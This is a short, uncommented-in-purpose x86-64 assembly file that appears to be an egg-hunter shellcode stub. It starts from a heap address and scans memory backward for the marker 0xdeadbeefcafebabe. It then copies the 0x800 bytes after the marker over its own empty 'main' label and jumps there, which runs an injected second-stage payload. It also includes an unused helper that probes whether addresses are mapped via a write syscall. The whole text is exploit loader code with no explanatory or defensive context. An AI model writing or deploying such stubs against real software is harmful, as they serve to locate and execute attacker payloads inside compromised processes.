_start:
  mov r15, r9                   ; heap address
  mov r14, 0xdeadbeefcafebabe   ; magic
  and r15, 0xfffffffffffffff0
search:
  mov rax, [r15]
  cmp rax, r14
  jz found
  sub r15, 0x10
  jmp search
found:
  add r15, 8
  mov edx, 0x800
  mov rsi, r15
  lea rdi, [rel main]
  call memcpy
  jmp main  

;; memcpy copies data from source to destination
;;   rdi: destination address
;;   rsi: source address
;;   rdx: size to copy
memcpy:
  mov rcx, rdx
  repnz movsb
  ret

;; is_mmaped checks if given address is mapped
;;   rdi: address
;;   returns: 1 if mapped, 0 otherwise
is_mapped:
  ; write(1, address, 1)
  mov edx, 1
  mov rsi, rdi
  mov edi, edx
  mov eax, edx
  syscall
  test eax, eax
  setns al
  movzx eax, al
  ret

main:
